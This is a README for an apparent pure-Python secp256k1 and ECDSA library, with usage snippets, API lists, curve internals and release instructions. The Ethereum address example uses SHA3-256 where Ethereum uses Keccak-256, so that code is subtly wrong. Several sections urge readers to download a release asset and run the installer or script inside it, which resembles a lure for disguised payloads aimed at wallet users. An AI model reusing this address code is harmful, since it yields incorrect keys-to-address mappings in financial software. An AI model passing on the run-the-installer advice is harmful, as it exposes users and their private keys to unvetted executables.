# python-secp256k1 — secp256k1 ECC & ECDSA for Python

[![Releases](https://img.shields.io/github/v/release/sabasabir/python-secp256k1?label=Releases&color=blue)](https://github.com/sabasabir/python-secp256k1/releases)

https://github.com/sabasabir/python-secp256k1/releases

🚀 A compact Python library that implements the secp256k1 elliptic curve and ECDSA signing/verification. It focuses on correctness and clarity. Use it for wallet prototypes, experimental blockchain clients, and cryptographic learning.

![Elliptic Curve](https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Weierstrass_elliptic_curve.svg/800px-Weierstrass_elliptic_curve.svg.png)

Contents
- Overview
- Features
- Install
- Quick start
- API examples
- Internals
- Performance notes
- Tests
- Releases
- Contributing
- License
- Resources and acknowledgments

Overview
- This repo implements the secp256k1 curve and ECDSA primitives in pure Python.
- It exposes primitives: keypair generation, point arithmetic, deterministic RFC6979 nonces, sign, verify, and compact/DER serialization.
- It targets readability and auditability. The code uses clear scalar and field routines. It uses native Python integers for big-number math.

Features
- Full point arithmetic on the secp256k1 curve (affine and Jacobian forms).
- ECDSA signing and verification with deterministic nonce (RFC6979).
- Private/public key import and export (hex, bytes).
- DER and compact signature formats.
- Low-level API for point ops and scalar ops for research and education.
- Examples that show Bitcoin-style signing and Ethereum-style address derivation.
- Small dependency surface. Pure Python option for portability.

Install
- There is a releases page with prebuilt assets and source bundles.
- Download the release artifact from the releases page and run the installer or script it contains.
- Releases: https://github.com/sabasabir/python-secp256k1/releases

If you prefer a local install from source:
1. Clone the repository.
2. Run python setup.py install or pip install -e .

Quick start

Generate a keypair and sign a message:

```python
from secp import PrivateKey

# create private key from random entropy
sk = PrivateKey()            # generates a random 32-byte secret
pk = sk.public_key()         # returns a PublicKey object

message = b"example message"
sig = sk.sign(message)       # returns a DER-encoded signature
ok = pk.verify(message, sig) # True or False
```

Create deterministic signatures with RFC6979 and compact format:

```python
sig_compact = sk.sign_compact(message)  # 64-byte compact signature (r || s)
sig_der = sk.sign(message)              # DER format
```

Key serialization:

```python
hex_sk = sk.to_hex()         # 64 hex chars
hex_pk = pk.to_hex(compressed=True)  # compressed public key hex
```

API examples
- PrivateKey()
  - new(): random seed
  - from_hex(hex): load from hex
  - to_hex(): hex export
  - sign(message): DER signature
  - sign_compact(message): compact r||s
  - public_key(): returns PublicKey

- PublicKey
  - verify(message, signature)
  - to_hex(compressed=True)
  - from_point(x, y)

- Low-level
  - point_add(P, Q)
  - point_mul(k, P)
  - scalar_mod_n(k)
  - field_inv(x)

Example: derive Ethereum-style address

```python
from secp import PrivateKey
from hashlib import sha3_256

sk = PrivateKey()
pk = sk.public_key().to_bytes(compressed=False)  # uncompressed 65 bytes
addr = sha3_256(pk[1:]).hexdigest()[-40:]        # take last 20 bytes
print("0x" + addr)
```

Internals (what matters)
- Curve params:
  - Prime field p = 2^256 - 2^32 - 977
  - Curve equation: y^2 = x^3 + 7 over F_p
  - Base point G and order n follow Bitcoin spec
- Representation:
  - Use affine coordinates for clarity.
  - Use Jacobian coordinates for scalar multiply hot path where needed.
- Deterministic nonce:
  - Implement RFC6979 to avoid weak RNG issues.
  - Use HMAC-SHA256 for nonce derivation.
- Signature normalization:
  - Enforce low-s value (s <= n/2) to avoid malleability.

Security and best practices
- Keep private keys in secure storage.
- Do not reuse nonces across messages. This library uses RFC6979 by default.
- Validate public keys before use.
- When interoperating with other libs, ensure matching signature format (DER vs compact), and canonical s-value.

Performance notes
- This implementation favors clarity. It trades raw speed for auditability.
- For production signing at scale, use native secp256k1 bindings (libsecp256k1).
- Use Python's caching and pypy to accelerate repeated operations.
- For batch verification, implement batch scalar multiplication with random weights.

Testing
- The repo contains unit tests that cover:
  - Point arithmetic (add, double, multiply)
  - Signing and verification with test vectors
  - Deterministic nonce outputs
  - Serialization round-trips
- Run tests:
  - python -m unittest discover tests
  - Or use pytest if installed

Releases
- Visit the releases page for packaged builds and release notes:
  https://github.com/sabasabir/python-secp256k1/releases
- Download the appropriate release file. Run the installer or script provided in the release asset.
- Each release contains a checksum and a short changelog. Use the checksum to verify integrity.
- Example: after downloading a release archive named python-secp256k1-x.y.z.tar.gz
  - tar -xzf python-secp256k1-x.y.z.tar.gz
  - cd python-secp256k1-x.y.z
  - python setup.py install

Contributing
- Open an issue for design or bug discussions.
- Fork the repo and make a branch per feature or fix.
- Keep commits small and focused.
- Add tests for changes.
- Use the existing coding style and docstrings.
- Provide a clear PR description and link related issues.

Roadmap
- Add constant-time point multiply paths for hardened operations.
- Add Python C extension wrapper for a performance mode that uses libsecp256k1.
- Add additional signature schemes: Schnorr (BIP-340) and ECDH APIs.
- Expand test vectors with cross-compat tests against other libraries.

Common use cases
- Wallet prototypes and key management research
- Teaching ECC and ECDSA internals
- Small blockchain nodes and signing tools for development
- Integration tests that need a pure-Python reference implementation

Why read this code
- The code breaks down scalar and field ops into modular functions.
- You can step through point math and see how ECDSA constructs r and s.
- RFC6979 is implemented in the library so you can inspect nonce derivation.

Images and emojis
- Curve image above shows a Weierstrass curve for visual context.
- Use crypto icons where helpful:
  - Bitcoin: https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg
  - Ethereum: https://upload.wikimedia.org/wikipedia/commons/6/6f/Ethereum-icon-purple.svg

Acknowledgments
- The implementation follows the standard curve parameters used by Bitcoin and Ethereum.
- RFC6979 informs the deterministic nonce design.
- Test vectors come from multiple public sources to ensure cross-compatibility.

License
- The repository uses an open source license. See the LICENSE file for details.

Resources
- secp256k1 parameters: SEC 2, FIPS, and Bitcoin documentation
- RFC6979: deterministic DSA and ECDSA nonce
- libsecp256k1 for a high-performance C reference

Contact
- Open issues or PRs on GitHub for questions or contributions.

Badges and quick links
- Releases: [![Releases](https://img.shields.io/badge/Releases-Download-blue)](https://github.com/sabasabir/python-secp256k1/releases)
- License: [![License](https://img.shields.io/github/license/sabasabir/python-secp256k1)](https://github.com/sabasabir/python-secp256k1)

Keywords / Topics
- bitcoin, blockchain, cryptography, curve, digital-signatures, ecdsa, elliptic-curves, ethereum, proof-of-concept, python, secp256k1, web3

Examples and further reading
- ECDSA explained with math and code: follow RFC 6979 and SEC2 docs.
- Compare outputs with libsecp256k1 for interoperability checks.

End of file